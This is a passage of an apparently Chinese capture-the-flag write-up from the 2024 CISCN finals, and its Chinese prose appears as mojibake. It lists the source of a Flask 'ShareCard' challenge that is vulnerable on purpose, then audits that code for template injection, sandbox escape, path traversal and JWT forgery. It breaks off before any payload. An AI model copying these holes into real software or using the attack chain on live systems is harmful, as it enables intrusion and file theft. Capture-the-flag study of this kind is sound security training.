keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .ejs files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token keyword">if</span> <span class="token punctuation">(</span>fileExt <span class="token operator">===</span> <span class="token string">'.js'</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>            <span class="token comment">// å¦‚æœæ–‡ä»¶åç¼€ä¸º .jsï¼Œåˆ™æ‹’ç»ä¸Šä¼ è¯¥æ–‡ä»¶</span>            <span class="token keyword">return</span> <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">new</span> <span class="token class-name">Error</span><span class="token punctuation">(</span><span class="token string">'Upload of .js files is not allowed'</span><span class="token punctuation">)</span><span class="token punctuation">,</span> <span class="token boolean">false</span><span class="token punctuation">)</span><span class="token punctuation">;</span>        <span class="token punctuation">&#125;</span>        <span class="token function">cb</span><span class="token punctuation">(</span><span class="token keyword">null</span><span class="token punctuation">,</span> <span class="token boolean">true</span><span class="token punctuation">)</span><span class="token punctuation">;</span> <span class="token comment">// å…è®¸ä¸Šä¼ å…¶ä»–ç±»å‹çš„æ–‡ä»¶</span>    <span class="token punctuation">&#125;</span><span class="token punctuation">&#125;</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token comment">/*...*/</span><span class="token keyword">if</span> <span class="token punctuation">(</span>newPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">app\.js|\\|\.ejs|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>newPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span class="token keyword">if</span> <span class="token punctuation">(</span>oldPath <span class="token operator">&amp;&amp;</span> <span class="token regex"><span class="token regex-delimiter">/</span><span class="token regex-source language-regex">\.\.|flag|node_modules</span><span class="token regex-delimiter">/</span><span class="token regex-flags">i</span></span><span class="token punctuation">.</span><span class="token function">test</span><span class="token punctuation">(</span>oldPath<span class="token punctuation">)</span><span class="token punctuation">)</span> <span class="token punctuation">&#123;</span>    <span class="token keyword">return</span> res<span class="token punctuation">.</span><span class="token function">status</span><span class="token punctuation">(</span><span class="token number">400</span><span class="token punctuation">)</span><span class="token punctuation">.</span><span class="token function">send</span><span class="token punctuation">(</span><span class="token string">'Invalid file name'</span><span class="token punctuation">)</span><span class="token punctuation">;</span><span class="token punctuation">&#125;</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><hr><h2 id="ShareCardï¼ˆbreakå¤ç°ï¼‰"><a href="#ShareCardï¼ˆbreakå¤ç°ï¼‰" class="headerlink" title="ShareCardï¼ˆbreakå¤ç°ï¼‰"></a>ShareCardï¼ˆbreakå¤ç°ï¼‰</h2><blockquote><p>SSTI + æ²™ç›’é€ƒé€¸</p></blockquote><p>æ€è·¯å‚è€ƒï¼šnepnepæˆ˜é˜Ÿçš„çŸ¥è¯†åˆ†äº«ä¼š <a href="https://www.bilibili.com/video/BV1gDv1eFEyN/">https://www.bilibili.com/video/BV1gDv1eFEyN/</a></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">from</span> flask <span class="token keyword">import</span> Flask<span class="token punctuation">,</span> request<span class="token punctuation">,</span> url_for<span class="token punctuation">,</span> redirect<span class="token punctuation">,</span> current_app<span class="token keyword">from</span> jinja2<span class="token punctuation">.</span>sandbox <span class="token keyword">import</span> SandboxedEnvironment<span class="token keyword">from</span> Crypto<span class="token punctuation">.</span>PublicKey <span class="token keyword">import</span> RSA<span class="token keyword">from</span> pydantic <span class="token keyword">import</span> BaseModel<span class="token keyword">from</span> io <span class="token keyword">import</span> BytesIO<span class="token keyword">import</span> qrcode<span class="token keyword">import</span> base64<span class="token keyword">import</span> json<span class="token keyword">import</span> jwt<span class="token keyword">import</span> os<span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span>app <span class="token operator">=</span> Flask<span class="token punctuation">(</span>__name__<span class="token punctuation">)</span>rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">index</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">return</span> redirect<span class="token punctuation">(</span>url_for<span class="token punctuation">(</span><span class="token string">'create_card'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token keyword">if</span> __name__ <span class="token operator">==</span> <span class="token string">"__main__"</span><span class="token punctuation">:</span>    app<span class="token punctuation">.</span>run<span class="token punctuation">(</span>host<span class="token operator">=</span><span class="token string">"0.0.0.0"</span><span class="token punctuation">,</span> port<span class="token operator">=</span><span class="token number">8888</span><span class="token punctuation">,</span> debug<span class="token operator">=</span><span class="token boolean">True</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æœ¬åœ°è¦è°ƒè¯•çš„æ—¶å€™å‘ç°ç»™çš„dist-packagesä¼šæŠ¥é”™ï¼Œå®é™…æœ‰é™åˆ¶pyç‰ˆæœ¬</p><p>å…ˆåœ¨linuxä¸‹èµ·ä¸€ä¸ªvenvç¯å¢ƒï¼Œæ³¨æ„è¦æ˜¯python3.8çš„ï¼š</p><pre class="line-numbers language-bash" data-language="bash"><code class="language-bash">python3 <span class="token parameter variable">-m</span> venv <span class="token builtin class-name">test</span><span class="token builtin class-name">source</span> test/bin/activate<span class="token comment">#pip3 install dist-packages.tar.gz</span><span class="token comment"># ä¸Šé¢è¿™ä¸ªç”¨ä¸äº†ï¼Œç¼ºå°‘setup.py</span><span class="token function">tar</span> <span class="token parameter variable">-zxvf</span> dist-packages.tar.gz <span class="token parameter variable">-C</span> dist-packages<span class="token function">cp</span> <span class="token parameter variable">-r</span> dist-packages/* test/lib/python3.8/site-packages/<span class="token builtin class-name">cd</span> srcpython app.py<span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>å®¡è®¡ä»£ç </p><p>é¦–å…ˆæ˜¯ &#x2F;createCard è·¯ç”±</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/createCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">,</span> <span class="token string">"POST"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">create_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>method <span class="token operator">==</span> <span class="token string">"GET"</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"create.html"</span><span class="token punctuation">)</span>    <span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>        <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span>    qr_img <span class="token operator">=</span> BytesIO<span class="token punctuation">(</span><span class="token punctuation">)</span>    qrcode<span class="token punctuation">.</span>make<span class="token punctuation">(</span>share_url<span class="token punctuation">)</span><span class="token punctuation">.</span>save<span class="token punctuation">(</span>qr_img<span class="token punctuation">,</span><span class="token string">'png'</span><span class="token punctuation">)</span>    qr_img<span class="token punctuation">.</span>seek<span class="token punctuation">(</span><span class="token number">0</span><span class="token punctuation">)</span>    share_img <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span>qr_img<span class="token punctuation">.</span>getvalue<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"created.html"</span><span class="token punctuation">,</span> share_url<span class="token operator">=</span>share_url<span class="token punctuation">,</span> share_img<span class="token operator">=</span>share_img<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809170450021.png" alt="image-20240809170450021"></p><p>æ³¨æ„åˆ°è¿™é‡Œå¯ä»¥å†™å…¥æ–‡ä»¶ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">if</span> request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token operator">!=</span><span class="token boolean">None</span><span class="token punctuation">:</span>    <span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/style.css'</span><span class="token punctuation">,</span><span class="token string">'w'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>write<span class="token punctuation">(</span>request<span class="token punctuation">.</span>form<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">'style'</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span></span></code></pre><p>æ‰¾ä¸€ä¸‹è¿™ä¸ª style.css æ–‡ä»¶è¢«å¯¼å…¥çš„åœ°æ–¹ï¼Œåœ¨ä¸‰ä¸ª html é‡Œé¢éƒ½æœ‰</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809171936436.png" alt="image-20240809171936436"></p><p>ä»¥æ¨¡æ¿çš„å½¢å¼åŒ…å«æ–‡ä»¶æ¥å¯¼å…¥ï¼Œç„¶åä¼šç”¨<code>safer_render_template</code>è¿›è¡Œæ¸²æŸ“</p><p>æˆ‘ä»¬å°è¯•ä¼ å…¥ä¸€ä¸‹ style å‚æ•°æ‰“sstiçœ‹çœ‹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173222915.png" alt="image-20240809173222915"></p><p>ç¡®å®å­˜åœ¨sstiï¼Œä½†æ˜¯ä¸èƒ½ç›´æ¥payloadä¸€æŠŠæ¢­ï¼Œå› ä¸ºè¿™é‡Œç”¨çš„æ˜¯è‡ªå®šä¹‰çš„<code>safer_render_template</code></p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">def</span> <span class="token function">safer_render_template</span><span class="token punctuation">(</span>template_name<span class="token punctuation">,</span> <span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span class="token punctuation">:</span>    env <span class="token operator">=</span> SaferSandboxedEnvironment<span class="token punctuation">(</span>loader<span class="token operator">=</span>current_app<span class="token punctuation">.</span>jinja_env<span class="token punctuation">.</span>loader<span class="token punctuation">)</span>    <span class="token keyword">return</span> env<span class="token punctuation">.</span>from_string<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'templates/'</span><span class="token operator">+</span>template_name<span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>render<span class="token punctuation">(</span><span class="token operator">**</span>kwargs<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span></span></code></pre><p>å¯ä»¥çœ‹åˆ°å¼€äº†ä¸ªæ²™ç›’</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">SaferSandboxedEnvironment</span><span class="token punctuation">(</span>SandboxedEnvironment<span class="token punctuation">)</span><span class="token punctuation">:</span>    <span class="token keyword">def</span> <span class="token function">is_safe_attribute</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">,</span> attr<span class="token punctuation">:</span> <span class="token builtin">str</span><span class="token punctuation">,</span> value<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">True</span>    <span class="token keyword">def</span> <span class="token function">is_safe_callable</span><span class="token punctuation">(</span>self<span class="token punctuation">,</span> obj<span class="token punctuation">)</span> <span class="token operator">-</span><span class="token operator">></span> <span class="token builtin">bool</span><span class="token punctuation">:</span>        <span class="token keyword">return</span> <span class="token boolean">False</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>è¿™é‡Œè®¾ç½®æˆèƒ½å¤Ÿè®¿é—®å±æ€§ï¼Œä½†æ˜¯ä¸èƒ½è°ƒç”¨ï¼Œç»™æ²™ç›’æ‹¦äº†</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809173315191.png" alt="image-20240809173315191"></p><p>æ€ä¹ˆåŠå‘¢ï¼Ÿç»§ç»­å®¡è®¡ä»£ç </p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token keyword">class</span> <span class="token class-name">Info</span><span class="token punctuation">(</span>BaseModel<span class="token punctuation">)</span><span class="token punctuation">:</span>    name<span class="token punctuation">:</span> <span class="token builtin">str</span>    avatar<span class="token punctuation">:</span> <span class="token builtin">str</span>    signature<span class="token punctuation">:</span> <span class="token builtin">str</span>    <span class="token keyword">def</span> <span class="token function">parse_avatar</span><span class="token punctuation">(</span>self<span class="token punctuation">)</span><span class="token punctuation">:</span>        self<span class="token punctuation">.</span>avatar <span class="token operator">=</span> base64<span class="token punctuation">.</span>b64encode<span class="token punctuation">(</span><span class="token builtin">open</span><span class="token punctuation">(</span><span class="token string">'avatars/'</span><span class="token operator">+</span>self<span class="token punctuation">.</span>avatar<span class="token punctuation">,</span><span class="token string">'rb'</span><span class="token punctuation">)</span><span class="token punctuation">.</span>read<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span><span class="token punctuation">.</span>decode<span class="token punctuation">(</span><span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>æ˜æ˜¾è¿™é‡Œå­˜åœ¨ä¸€ä¸ªæ–‡ä»¶è¯»å–ï¼Œçœ‹ä¸€ä¸‹<code>parse_avatar</code>è°ƒç”¨çš„ä½ç½®ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python"><span class="token decorator annotation punctuation">@app<span class="token punctuation">.</span>route</span><span class="token punctuation">(</span><span class="token string">"/showCard"</span><span class="token punctuation">,</span> methods<span class="token operator">=</span><span class="token punctuation">[</span><span class="token string">"GET"</span><span class="token punctuation">]</span><span class="token punctuation">)</span><span class="token keyword">def</span> <span class="token function">show_card</span><span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">:</span>    token <span class="token operator">=</span> request<span class="token punctuation">.</span>args<span class="token punctuation">.</span>get<span class="token punctuation">(</span><span class="token string">"token"</span><span class="token punctuation">)</span>    data <span class="token operator">=</span> jwt<span class="token punctuation">.</span>decode<span class="token punctuation">(</span>token<span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>publickey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithms<span class="token operator">=</span>jwt<span class="token punctuation">.</span>algorithms<span class="token punctuation">.</span>get_default_algorithms<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">)</span>    info <span class="token operator">=</span> Info<span class="token punctuation">(</span><span class="token operator">**</span>data<span class="token punctuation">)</span>    info<span class="token punctuation">.</span>parse_avatar<span class="token punctuation">(</span><span class="token punctuation">)</span>    <span class="token keyword">return</span> safer_render_template<span class="token punctuation">(</span><span class="token string">"show.html"</span><span class="token punctuation">,</span> info<span class="token operator">=</span>info<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>åœ¨ &#x2F;showCard è·¯ç”±ä¸‹</p><p>æˆ‘ä»¬æ­£å¸¸ç”Ÿæˆä¸€ä¸ªäºŒç»´ç ä¹‹åç‚¹å‡»äºŒç»´ç å°±å¯ä»¥è·³è½¬åˆ° &#x2F;showcard ä¸‹ï¼ŒåŒæ—¶åé¢ä¼šè·Ÿä¸€ä¸²token</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174116052.png" alt="image-20240809174116052"></p><p>ä¸€çœ¼jwtï¼Œè§£ç ä¸€ä¸‹çœ‹çœ‹</p><p><img src="/blog/2024/07/12/2024CISCN%E5%86%B3%E8%B5%9B/image-20240809174228055.png" alt="image-20240809174228055"></p><p>ç›¸å…³çš„ç”Ÿæˆä»£ç ï¼š</p><pre class="line-numbers language-python" data-language="python"><code class="language-python">rsakey <span class="token operator">=</span> RSA<span class="token punctuation">.</span>generate<span class="token punctuation">(</span><span class="token number">1024</span><span class="token punctuation">)</span>info<span class="token operator">=</span>Info<span class="token punctuation">(</span><span class="token operator">**</span>request<span class="token punctuation">.</span>form<span class="token punctuation">)</span>    <span class="token keyword">if</span> info<span class="token punctuation">.</span>avatar <span class="token keyword">not</span> <span class="token keyword">in</span> os<span class="token punctuation">.</span>listdir<span class="token punctuation">(</span><span class="token string">'avatars'</span><span class="token punctuation">)</span><span class="token punctuation">:</span>        <span class="token keyword">raise</span> FileNotFoundError    token <span class="token operator">=</span> jwt<span class="token punctuation">.</span>encode<span class="token punctuation">(</span><span class="token builtin">dict</span><span class="token punctuation">(</span>info<span class="token punctuation">)</span><span class="token punctuation">,</span> rsakey<span class="token punctuation">.</span>exportKey<span class="token punctuation">(</span><span class="token punctuation">)</span><span class="token punctuation">,</span> algorithm<span class="token operator">=</span><span class="token string">"RS256"</span><span class="token punctuation">)</span>    share_url <span class="token operator">=</span> request<span class="token punctuation">.</span>url_root <span class="token operator">+</span> url_for<span class="token punctuation">(</span><span class="token string">'show_card'</span><span class="token punctuation">,</span> token<span class="token operator">=</span>token<span class="token punctuation">)</span><span aria-hidden="true" class="line-numbers-rows"><span></span><span></span><span></span><span></span><span></span><span></span><span></span></span></code></pre><p>ç”±äº<code>if info.avatar not in os.listdir(&#39;avatars&#39;)</code>çš„å­˜åœ¨ï¼Œå¯¼è‡´æˆ‘ä»¬ä¸èƒ½ç›´æ¥åœ¨ avatar å‚æ•°ä¸Šè¿›è¡Œç›®å½•ç©¿è¶Š</p><p>é‚£ä¹ˆè€ƒè™‘ jwt ä¼ªé€  avatar çš„å€¼ï¼Œä½†æ˜¯è¿™é‡Œjwtçš„keyæ˜¯rsaç”Ÿæˆçš„ï¼Œæˆ‘ä»¬éœ€è¦æƒ³åŠæ³•å¾—åˆ° rsakey</p><p>è¿™æ—¶å€™å°±åˆæƒ³åˆ°å‰é¢çš„ ssti 